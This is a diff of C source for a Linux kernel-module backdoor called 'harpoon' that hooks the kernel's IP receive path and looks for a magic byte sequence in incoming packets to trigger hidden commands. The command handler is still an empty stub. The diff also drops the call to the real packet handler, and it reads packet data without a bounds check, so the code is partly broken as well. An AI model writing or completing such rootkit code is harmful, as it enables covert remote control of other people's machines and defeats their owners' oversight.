@@ -2,12 +2,45 @@
 
 #include "backdoor.h"
 
-extern int (*legit_ip_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
-        struct net_device *orig_dev);
+void harpoon_parse_cmd(struct sk_buff *skb)
+{
+    return;
+}
 
-int harpoon_ip_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
-        struct net_device *orig_dev){
+bool is_harpoon_packet(struct sk_buff *skb)
+{
+    __u8 *sk_data;
+    __u32 sk_data_len;
+
+    if (!skb)
+    {
+        return false;
+    }
+    sk_data = skb_mac_header(skb);
+    if (skb_is_nonlinear(skb))
+    {
+        sk_data_len = skb->data_len;
+    }
+    else
+    {
+        sk_data_len = skb->len;
+    }
+
+    if(!memcmp(sk_data, HARPOON_MAGIC, HARPOON_MAGIC_LEN)){
+        printk(KERN_INFO "Harpoon magic found");
+    }
+
+    return false;
+}
+
+void harpoon_ip_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
+                    struct net_device *orig_dev)
+{
 
     printk(KERN_INFO "Hooked ip_rcv\n");
-    return legit_ip_rcv(skb, dev, pt, orig_dev);
+    if (is_harpoon_packet(skb))
+    {
+        harpoon_parse_cmd(skb);
+    }
+    return;
 }
